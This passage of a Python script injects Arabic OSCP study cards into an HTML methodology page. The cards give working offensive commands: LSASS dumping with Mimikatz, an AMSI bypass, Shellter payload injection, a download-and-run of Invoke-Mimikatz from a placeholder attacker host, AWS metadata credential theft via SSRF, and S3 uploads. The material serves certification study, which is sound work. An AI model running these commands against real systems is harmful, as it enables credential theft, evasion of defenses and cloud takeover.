              <p style="font-size:0.85rem; margin:5px 0;">أول ما تفعله عند الدخول هو الإجابة على: "أنا من؟، ما هو هذا النظام؟، وما هي الأجهزة المتصلة به؟". استخراج جدول التوجيه (Routing Table) والاتصالات المفتوحة سيكشف لك عن الشبكات الداخلية الأخرى التي ستستهدفها تالياً.</p>
              <div class="code-snippet">whoami /all
ipconfig /all
netstat -ano
arp -a
route print</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#10b981;">2. سحب الأدلة الرسمية (Evidence Collection)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">بدون الحصول على ملفات الإثبات، لن يعترف OffSec باختراقك للآلة. ابحث فوراً عن ملف الـ (proof.txt) لمدير النظام و الـ (local.txt) للمستخدم العادي، واقرأ محتواهما واصنع لقطة الشاشة المطلوبة لتقريرك.</p>
              <div class="code-snippet">type C:\\Users\\[User]\\Desktop\\local.txt
cat /root/proof.txt</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#10b981;">3. حصاد كلمات المرور من الذاكرة (Credential Harvesting via LSASS)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">إذا امتلكت صلاحية النظام، يمكنك سرقة كلمات مرور جميع المستخدمين الذين قاموا بتسجيل الدخول على الآلة. أفضل طريقة آمنة هي سحب نسخة من ذاكرة الـ LSASS باستخدام Procdump، ثم تحليلها لاحقاً بجهازك بأداة Mimikatz لاستخراج كلمات المرور الواضحة والهاشات.</p>
              <div class="code-snippet"># Dump LSASS memory
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Extract offline with Mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#10b981;">4. تنظيف مسرح الجريمة (House Cleaning)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">أخلاقيات الهاكر المحترف تتطلب منه إعادة النظام كما كان. تذكر دائماً حذف أي استغلالات (Exploits) أو أدوات (مثل linpeas) رفعتها لتجنب لفت انتباه مدراء النظام أو التشويش على من يفحص بعدك.</p>
              <div class="code-snippet">rm /tmp/linpeas.sh
del C:\\Temp\\winpeas.exe</div>
            </div>
          </div>
        </div>
      </div>""",

    "meth-content-oscp_evade": """
      <!-- OSCP: AV Evasion -->
      <div class="meth-content-view" id="meth-content-oscp_evade" style="display: none; --tool-color: #9333ea;">
        <div class="phase-module-header">
          <div class="icon-wrapper">🥷</div>
          <div class="header-text">
            <h2>التخفي وتجاوز الحماية (AV Evasion & AMSI Bypass)</h2>
            <p>تخطّي تقنيات الحماية مثل Windows Defender والـ AMSI التي تمنع تنفيذ الأكواد والمبرمجات الخبيثة داخل بيئات الويندوز المحدثة.</p>
          </div>
        </div>
        <div class="cyber-card" style="margin-top:20px; border-left: 3px solid #9333ea;">
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            
            <div class="cmd-card">
              <strong style="color:#9333ea;">1. تعمية واجهة فحص البرامج الضارة (AMSI Bypass)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">الـ AMSI هو نظام من مايكروسوفت يقوم بفحص أي سكربت يتم تنفيذه في الـ PowerShell قبل أن يُرسل للذاكرة. لتشغيل برامج مثل Mimikatz في الباورشيل، يجب أولاً حقن الذاكرة بأمر يقوم بتعطيل وظيفة الفحص وإجبارها على إرجاع نتيجة "آمن" دائماً.</p>
              <div class="code-snippet"># Obfuscated AmsiScanBuffer patch (Example)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#9333ea;">2. حقن الملفات الديناميكي باستخدام (Shellter)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">استخدام الـ Payloads الافتراضية الخاصة بـ Metasploit يتم اكتشافها فوراً لكون بصمتها معروفة. برنامج Shellter يقوم بتغيير هذه البصمة (Polymorphism) عن طريق حقن الـ Payload المخفي داخل ملف تنفيذي حقيقي وسليم (مثل Putty.exe) بحيث يتم تجاوز مكافح الفيروسات الساكن (Static Analysis).</p>
              <div class="code-snippet">sudo apt install shellter
shellter
# Follow prompts: Select target executable -> Select Payload -> Inject</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#9333ea;">3. التنفيذ الكلي داخل الذاكرة (In-Memory Execution)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">أكبر خطأ يقع فيه الهاكر هو تنزيل ملف الاختراق (exe أو ps1) على القرص الصلب حيث يسهل التقاطه. الأسلوب الاحترافي هو تحميل كود الـ PowerShell من الإنترنت وتنفيذه فوراً داخل الذاكرة العشوائية (RAM) دون كتابة أي شيء على القرص.</p>
              <div class="code-snippet">IEX (New-Object Net.WebClient).DownloadString('http://[KALI]/Invoke-Mimikatz.ps1')</div>
            </div>
          </div>
        </div>
      </div>""",

    "meth-content-oscp_cloud": """
      <!-- OSCP: Cloud/AWS -->
      <div class="meth-content-view" id="meth-content-oscp_cloud" style="display: none; --tool-color: #f59e0b;">
        <div class="phase-module-header">
          <div class="icon-wrapper">☁️</div>
          <div class="header-text">
            <h2>فحص واختراق بيئة السحابة (Cloud / AWS Enumeration)</h2>
            <p>تم تحديث شهادة OSCP مؤخراً لتشمل مفاهيم الحوسبة السحابية نظراً لانتشارها. يجب أن تكون مستعداً للتعامل مع خدمات الحوسبة لشركة Amazon (AWS) واستغلال إعداداتها الخاطئة.</p>
          </div>
        </div>
        <div class="cyber-card" style="margin-top:20px;">
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            
            <div class="cmd-card">
              <strong style="color:#f59e0b;">1. استغلال ثغرات الـ SSRF لسرقة بيانات الدخول السحابية</strong>
              <p style="font-size:0.85rem; margin:5px 0;">عند العثور على ثغرة SSRF في تطبيق ويب مستضاف على خدمة AWS EC2، لا نستخدمها لفحص الشبكة فحسب، بل الأهم هو توجيهها للـ "البيانات الوصفية" (Instance Metadata) على الآيبي السحري الخاص بأمازون (169.254.169.254). من خلاله يمكننا سرقة مفاتيح (Access Keys) تعطينا تحكم كامل في حساب الكلاود.</p>
              <div class="code-snippet">curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#f59e0b;">2. اكتشاف ثغرات تخزين الـ S3 Buckets</strong>
              <p style="font-size:0.85rem; margin:5px 0;">تُستخدم الـ S3 لتخزين الملفات. العديد من الشركات تخطئ في إعداداتها فتتركها عامة، مما يتيح لك كسحب بيانات سرية (كود المصدر، بيانات العملاء) أو الأخطر: رفع ملفات خبيثة إلى مساحات التخزين المرتبطة بمواقع حية للتحكم بها.</p>
              <div class="code-snippet">aws s3 ls s3://[bucket-name] --no-sign-request
aws s3 cp localfile.txt s3://[bucket-name]/ --no-sign-request</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#f59e0b;">3. ضبط موجه أوامر AWS (AWS CLI Configuration)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">إذا نجحت في سرقة مفاتيح الوصول (Access Key و Secret Key و Session Token)، يجب عليك دمج هذه المفاتيح في سطر الأوامر الخاص بجهاز كالي لكي يبدأ جهازك بالتصرف وكأنه مدير النظام السحابي، لتقوم بمهام الاختراق المتقدمة.</p>
              <div class="code-snippet">aws configure
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."</div>
            </div>
          </div>
        </div>
      </div>"""
}

# The goal is to replace each block in methodology.html
# We can use regex to find `<div class="meth-content-view" id="{key}"` up to `<!-- OSCP` or the final `</div>\n</div>` or `</div>\n<!--`

# Because the DOM structure can be tricky, we'll iterate through the keys and replace everything between the specific `id` div and the start of the next phase.

for key, new_html in replacements.items():
    # Regex to capture from the start of the div to the end of its content
    # A meth-content-view div is closed by the second-to-last </div> before the next comment or phase-module-header
    # Wait, actually it's easier: since we know the exact HTML of the file, we can just find the start of the div, and the end of the div.
    # It starts with: `      <div class="meth-content-view" id="{key}"`
    # It ends with `      </div>\n` that is right before the next `      <!-- OSCP:` or `</div>`
    
    start_str = f'<div class="meth-content-view" id="{key}"'
    idx_start = content.find(start_str)
    if idx_start == -1:
        print(f"Error: Could not find {key}")
        continue
    
    # We must find where this meth-content-view closes.
    # We can do this by counting <div and </div tags.
    div_count = 0
    idx_end = -1
    
    # Let's search from idx_start
    i = idx_start
    while i < len(content):
        if content[i:i+4] == "<div":
            div_count += 1
            i += 4
        elif content[i:i+6] == "</div>":
            div_count -= 1
            if div_count == 0:
                idx_end = i + 6
                break
            i += 6
        else:
            i += 1
            
    if idx_end != -1:
        # Include any leading comment if possible, but our `new_html` already has the comment `<!-- OSCP: ... -->`.
        # The original string has `<!-- OSCP: ... -->\n      <div...`
        # Let's just find the comment right before it.
        comment_idx = content.rfind("<!-- OSCP:", 0, idx_start)
        if comment_idx != -1 and (idx_start - comment_idx) < 100:
            idx_start = comment_idx
            
        content = content[:idx_start] + new_html + content[idx_end:]
        print(f"Successfully replaced {key}")
    else:
        print(f"Error: Could not find end of {key}")

with open(html_path, "w", encoding="utf-8") as f:
    f.write(content)
print("Finished rewriting OSCP content with Arabic explanations.")
